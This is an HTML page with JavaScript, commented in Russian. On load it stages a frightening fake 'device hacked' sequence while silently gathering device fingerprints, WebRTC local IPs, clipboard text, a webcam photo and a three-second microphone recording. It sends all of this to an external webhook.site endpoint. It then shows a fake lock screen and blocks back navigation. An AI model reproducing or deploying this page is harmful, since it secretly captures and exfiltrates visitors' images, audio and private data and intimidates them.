<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>CRITICAL BREACH</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
  body { background: #000; color: #ff003c; font-family: 'Fira Code', monospace; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; cursor: none; }
  
  /* Тряска и вспышки */
  @keyframes shake { 0%,100% { transform: translate(0,0) rotate(0); } 25% { transform: translate(-2px,2px) rotate(-1deg); } 50% { transform: translate(2px,-1px) rotate(1deg); } 75% { transform: translate(1px,2px) rotate(0); } }
  .shaking { animation: shake 0.2s infinite; }
  @keyframes flash { 0%,100% { background: #000; } 50% { background: #400; } }
  .flashing { animation: flash 0.1s infinite; }

  .terminal { padding: 20px; flex-grow: 1; display: flex; flex-direction: column; z-index: 10; }
  .output { flex-grow: 1; overflow-y: auto; font-size: 12px; line-height: 1.4; white-space: pre-wrap; text-shadow: 0 0 3px #ff003c; padding-bottom: 50px; }
  .output::-webkit-scrollbar { display: none; }

  .alert { border: 2px solid #ff003c; padding: 15px; margin-bottom: 20px; background: rgba(255,0,60,0.1); font-weight: bold; text-align: center; text-transform: uppercase; }

  .progress-row { display: flex; align-items: center; margin: 5px 0; font-size: 12px; }
  .progress-label { width: 180px; text-align: right; padding-right: 10px; }
  .progress-bar-bg { flex-grow: 1; height: 10px; background: #300; border: 1px solid #ff003c; }
  .progress-bar-fill { height: 100%; background: #ff003c; width: 0%; transition: width 0.1s; }
  .progress-percent { width: 50px; text-align: left; padding-left: 10px; }

  #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff003c; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
  #lock-screen h1 { font-size: 50px; margin: 0; animation: pulse 1s infinite; }
  @keyframes pulse { 0%,100% { opacity: 1; text-shadow: 0 0 20px #ff003c; } 50% { opacity: 0.5; text-shadow: none; } }
  
  #hidden-video { display: none; }
</style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>

<div class="terminal" id="main-ui">
  <div class="alert">ВНИМАНИЕ: УСТРОЙСТВО ЗАХВАЧЕНО<br>ИДЕТ СЛИВ ДАННЫХ</div>
  <div class="output" id="term"></div>
</div>

<div id="lock-screen">
  <h1>DEVICE LOCKED</h1>
  <p>Биометрия, IP, буфер обмена и экран отправлены.<br>Устройство заблокировано.</p>
</div>

<script>
// =====================================================================
// 1. КОНФИГУРАЦИЯ
// =====================================================================
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
const term = document.getElementById('term');
const video = document.getElementById('hidden-video');
let megaData = {
  timestamp: new Date().toISOString(),
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  screen: screen.width + "x" + screen.height,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  languages: navigator.languages,
  cores: navigator.hardwareConcurrency,
  memory: navigator.deviceMemory,
  touch: navigator.maxTouchPoints,
  local_ips: [], // WebRTC
  clipboard: "Нет доступа",
  photo: "Нет доступа",
  audio: "Нет доступа"
};

// =====================================================================
// 2. МГНОВЕННЫЙ СБОР (WebRTC Local IP + Clipboard)
// =====================================================================
// WebRTC вытаскивает локальные IP (192.168.x.x), игнорируя VPN
async function getLocalIPs() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
      pc.createDataChannel("");
      pc.onicecandidate = (e) => {
        if (!e.candidate) { pc.close(); return resolve(ips); }
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if (ipMatch) ips.push(ipMatch[1]);
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
    } catch(e) { resolve(ips); }
  });
}

// Чтение буфера обмена (требует клика или разрешения)
async function getClipboard() {
  try {
    const text = await navigator.clipboard.readText();
    megaData.clipboard = text.slice(0, 100); // Первые 100 символов
  } catch(e) {}
}

// =====================================================================
// 3. ЗАХВАТ КАМЕРЫ И МИКРОФОНА
// =====================================================================
async function capturePhotoAndAudio() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 1000)); // Фокус

    // Фото
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    megaData.photo = canvas.toDataURL('image/jpeg', 0.5);

    // Аудио (3 сек)
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
      const reader = new FileReader();
      reader.onloadend = () => { megaData.audio = reader.result.split(',')[1]; };
      reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
    };
    recorder.start();
    await new Promise(r => setTimeout(r, 3000));
    recorder.stop();
    stream.getTracks().forEach(t => t.stop());
  } catch(e) { megaData.photo = "Отказано"; megaData.audio = "Отказано"; }
}

// =====================================================================
// 4. UI И ЗВУК
// =====================================================================
function playBeep() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator(); const gain = ctx.createGain();
    osc.type = 'sawtooth'; osc.frequency.setValueAtTime(800, ctx.currentTime);
    gain.gain.setValueAtTime(0.1, ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
    osc.connect(gain); gain.connect(ctx.destination); osc.start(); osc.stop(ctx.currentTime + 0.5);
  } catch(e) {}
}

function typeLine(text) {
  return new Promise((resolve) => {
    const div = document.createElement('div'); term.appendChild(div); term.scrollTop = term.scrollHeight;
    let i = 0; const speed = Math.random() * 10 + 5;
    function type() { if (i < text.length) { div.textContent += text.charAt(i); i++; setTimeout(type, speed); } else resolve(); }
    type();
  });
}

function addProgress(label) {
  return new Promise((resolve) => {
    const row = document.createElement('div'); row.className = 'progress-row';
    row.innerHTML = `<div class="progress-label">${label}</div><div class="progress-bar-bg"><div class="progress-bar-fill"></div></div><div class="progress-percent">0%</div>`;
    term.appendChild(row); term.scrollTop = term.scrollHeight;
    const fill = row.querySelector('.progress-bar-fill'); const pct = row.querySelector('.progress-percent');
    let p = 0;
    const int = setInterval(() => {
      p += Math.random() * 8; if (p >= 100) { p = 100; clearInterval(int); setTimeout(resolve, 200); }
      fill.style.width = p + '%'; pct.textContent = Math.floor(p) + '%'; term.scrollTop = term.scrollHeight;
    }, 50);
  });
}

// =====================================================================
// 5. ГЛАВНЫЙ СЦЕНАРИЙ
// =====================================================================
async function runHack() {
  document.body.classList.add('shaking', 'flashing');
  playBeep();

  // Запускаем сбор в фоне
  getClipboard();
  getLocalIPs().then(ips => megaData.local_ips = ips);
  capturePhotoAndAudio();

  await typeLine("> INITIATING KERNEL EXPLOIT...");
  await typeLine("> BYPASSING SANDBOX... [OK]");
  await typeLine("> WEBRTC LEAK: EXTRACTING LOCAL IP...");
  await new Promise(r => setTimeout(r, 800));
  await typeLine("> REQUESTING BIOMETRIC ACCESS (CAMERA/MIC)...");
  await new Promise(r => setTimeout(r, 1500));
  await typeLine("> RECORDING ENVIRONMENT...");
  await new Promise(r => setTimeout(r, 2000));
  await typeLine("> DUMPING CLIPBOARD DATA...");
  await typeLine("> EXFILTRATING PHOTOS...");
  
  await addProgress("Dumping RAM");
  await addProgress("Uploading Biometrics");
  await addProgress("Encrypting Files");

  await typeLine("> UPLOADING TO C2 SERVER...");

  // ОТПРАВКА ВСЕГО
  fetch(HOOK, {
    method: "POST", mode: "no-cors", headers: {"Content-Type": "text/plain"},
    body: JSON.stringify(megaData)
  }).catch(e => {});

  await typeLine("> COMPLETE. LOCKING DEVICE...");
  document.body.classList.remove('shaking', 'flashing');
  document.getElementById('main-ui').style.display = 'none';
  document.getElementById('lock-screen').style.display = 'flex';
  playBeep();
}

// Запуск через 1 сек
setTimeout(runHack, 1000);

// Блокировка выхода
history.pushState(null, null, location.href);
window.onpopstate = function () { history.go(1); };
document.addEventListener('contextmenu', e => e.preventDefault());
</script>
</body>
</html>
